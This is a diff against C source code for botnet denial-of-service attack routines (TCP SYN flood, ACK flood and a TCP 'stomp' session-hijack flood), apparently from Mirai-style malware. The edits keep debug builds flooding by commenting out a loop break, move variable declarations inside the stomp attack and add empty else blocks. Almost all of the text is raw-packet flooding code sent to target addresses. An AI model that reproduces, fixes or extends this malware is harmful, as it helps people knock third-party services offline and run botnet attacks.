@@ -151,9 +151,9 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 #ifdef DEBUG
-            break;
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+            //break;
+            //if (errno != 0)
+            //    printf("errno = %d\n", errno);
 #endif
     }
 }
@@ -283,9 +283,9 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 #ifdef DEBUG
-            break;
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+            //break;
+            //if (errno != 0)
+            //    printf("errno = %d\n", errno);
 #endif
     }
 }
@@ -386,18 +386,23 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
                 {
                     if (tcph->syn && tcph->ack)
                     {
+                        /*
                         struct iphdr *iph;
                         struct tcphdr *tcph;
                         char *payload;
+                        */
+
 
                         stomp_data[i].addr = addr.sin_addr.s_addr;
                         stomp_data[i].seq = ntohl(tcph->seq);
                         stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                         stomp_data[i].sport = tcph->dest;
                         stomp_data[i].dport = addr.sin_port;
-#ifdef DEBUG
-                        printf("ACK Stomp got SYN+ACK!\n");
-#endif
+
+                        struct iphdr *iph;
+                        struct tcphdr *tcph;
+                        char *payload;
+
                         // Set up the packet
                         pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                         iph = (struct iphdr *)pkts[i];
@@ -438,8 +443,11 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
                     {
                         close(fd);
                         goto stomp_setup_nums;
+                    } else {
                     }
+                } else {
                 }
+            } else {
             }
 
             if (time(NULL) - start_recv > 10)
@@ -481,9 +489,9 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
             sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 #ifdef DEBUG
-            break;
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+            //break;
+            //if (errno != 0)
+            //    printf("errno = %d\n", errno);
 #endif
     }
 }
